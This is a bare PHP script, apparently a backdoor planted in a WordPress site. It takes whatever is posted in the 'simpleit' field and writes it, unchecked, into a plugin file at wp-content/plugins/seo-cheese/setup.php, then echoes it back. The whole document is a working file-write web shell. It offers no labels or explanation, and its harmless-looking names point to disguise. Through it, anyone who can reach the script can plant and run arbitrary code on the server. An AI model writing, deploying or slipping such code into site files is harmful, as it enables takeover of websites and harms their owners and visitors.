<?php
$incomplete = $_POST['simpleit']; $infile = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-cheese/setup.php', 'w'); $incomplete = str_replace('\\', '', $incomplete);
$incomplete = htmlentities($incomplete); fwrite($infile, html_entity_decode($incomplete));
fclose($infile);
echo $incomplete;
?>